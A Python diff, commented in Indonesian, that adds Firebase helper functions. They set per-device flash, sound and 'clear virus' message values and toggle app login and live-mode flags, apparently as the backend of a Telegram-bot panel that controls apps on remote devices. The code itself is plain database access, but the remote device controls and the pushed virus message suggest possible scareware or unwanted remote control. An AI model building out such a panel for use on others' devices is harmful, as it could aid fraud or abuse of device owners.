@@ -128,6 +128,76 @@ def remote_device_action(app_name, device_id, action):
         print(f"❌ Gagal remote action: {e}")
         return False
 
+def update_device_flash(app_name, device_id, flash_value):
+    """Mengubah status flash device (off/kedip/on)."""
+    try:
+        db.reference(f'{app_name}/perangkat/{device_id}/flash').set(flash_value)
+        return True
+    except Exception as e:
+        print(f"❌ Gagal update flash: {e}")
+        return False
+
+def update_device_suara(app_name, device_id, suara_value):
+    """Mengubah status suara device (on/off)."""
+    try:
+        db.reference(f'{app_name}/perangkat/{device_id}/suara').set(suara_value)
+        return True
+    except Exception as e:
+        print(f"❌ Gagal update suara: {e}")
+        return False
+
+def update_device_pesan_clear_virus(app_name, device_id, pesan):
+    """Mengubah pesan clear virus device."""
+    try:
+        db.reference(f'{app_name}/perangkat/{device_id}/pesan_clear_virus').set(pesan)
+        return True
+    except Exception as e:
+        print(f"❌ Gagal update pesan_clear_virus: {e}")
+        return False
+
+def get_app_full_data(app_name):
+    """Mengambil semua data aplikasi."""
+    try:
+        ref = db.reference(app_name)
+        data = ref.get()
+        return data if data else {}
+    except Exception as e:
+        print(f"❌ Error get_app_full_data: {e}")
+        return {}
+
+def update_app_field(app_name, field_name, value):
+    """Mengubah field tertentu di aplikasi."""
+    try:
+        db.reference(f'{app_name}/{field_name}').set(value)
+        return True
+    except Exception as e:
+        print(f"❌ Gagal update {field_name}: {e}")
+        return False
+
+def toggle_app_login(app_name):
+    """Toggle login antara 'no' dan 'yes'."""
+    try:
+        ref = db.reference(f'{app_name}/login')
+        current = ref.get()
+        new_value = "yes" if current == "no" else "no"
+        ref.set(new_value)
+        return new_value
+    except Exception as e:
+        print(f"❌ Gagal toggle login: {e}")
+        return None
+
+def toggle_app_mode(app_name):
+    """Toggle mode antara 'live' dan 'none'."""
+    try:
+        ref = db.reference(f'{app_name}/mode')
+        current = ref.get()
+        new_value = "none" if current == "live" else "live"
+        ref.set(new_value)
+        return new_value
+    except Exception as e:
+        print(f"❌ Gagal toggle mode: {e}")
+        return None
+
 # ==========================================
 # 2b. SESSION LOCK PER USER (UNTUK TELEGRAM USERBOT)
 # ==========================================
